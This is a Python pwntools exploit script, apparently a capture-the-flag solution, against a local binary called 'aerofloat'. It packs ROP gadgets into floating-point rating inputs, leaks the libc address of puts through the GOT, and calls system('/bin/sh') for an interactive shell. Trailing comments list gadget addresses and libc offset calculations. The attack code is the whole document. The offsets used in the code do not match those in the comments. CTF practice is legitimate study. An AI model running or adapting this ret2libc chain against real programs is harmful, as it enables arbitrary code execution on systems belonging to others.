from pwn import *
import struct

p = process('./aerofloat')

print(p.recvuntil(':').decode('utf-8'))

# Set name:
p.sendline(b'A'*8)
p.recvuntil('> ')

def setRating(ticket, score):
    p.sendline(b'1')
    p.recvuntil(': ')
    print('[*] ticket: %s, score: %s' % (ticket, score))
    p.sendline(ticket)
    p.recvuntil(': ')
    p.sendline(score)
    p.recvuntil('> ')

def byte_to_float(data):
    assert len(data) == 8
    return str(struct.unpack('d', data)[0]).encode()

for x in range(0, 12):
    setRating(b'0', b'5')

pop_rdi = p64(0x4015bb)

setRating(b'A', byte_to_float(pop_rdi)) # ROP1 (pop rdi; ret)

setRating(p64(0x404018), byte_to_float(p64(0x401030)))
setRating(p64(0x401192), byte_to_float(p64(0x401192)))

# main()
p.sendline(b'4')
p.recvuntil('> ')

leak = p.recvuntil(': ')
leak = leak[:6]
leak += b"\x00\x00"
leak = struct.unpack("<Q", leak)[0]

print("Libc puts leak: " + hex(leak))
system_address = leak-0x31580
print("System()? : " + hex(system_address))

p.sendline(b'A'*8)
p.recvuntil('>')

for _ in range(0, 12):
    setRating(b'A', b'5')

bin_sh_string = p64(system_address+0x1334da)

libc_base = leak - 0x0809c0

sh_string2 = libc_base + 0x1b3e9a

setRating(b'A'*8, byte_to_float(pop_rdi)) # ROP1 (pop rdi; ret)

setRating(p64(sh_string2), byte_to_float(p64(0x0401016)))
setRating(p64(system_address), byte_to_float(b'1'*8))
setRating("AAAAA", "AAAA")

p.sendline(b'4')

p.interactive()

'''
0x401030 <puts@plt>
0x00000000004015bb : pop rdi ; ret
0x0000000000401012 : add rsp, 8 ; ret

puts@plt:
   0x0000000000401030 <+0>:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018

$2 = {<text variable, no debug info>} 0x401192 <main>

.....
libc leak: 0x7f9f6c02e050

junior@junior:~/aero$ nm -D ./libc.so.6 | grep puts
0000000000074050 W puts

junior@junior:~/aero$ nm -D ./libc.so.6 | grep system
0000000000046ff0 W system

puts-system = 0x2d060
puts - 0x2d060 = system


0x7f4c7bbefff0 <- system
0x7f4c7bd2ccee <- /bin/sh

'''
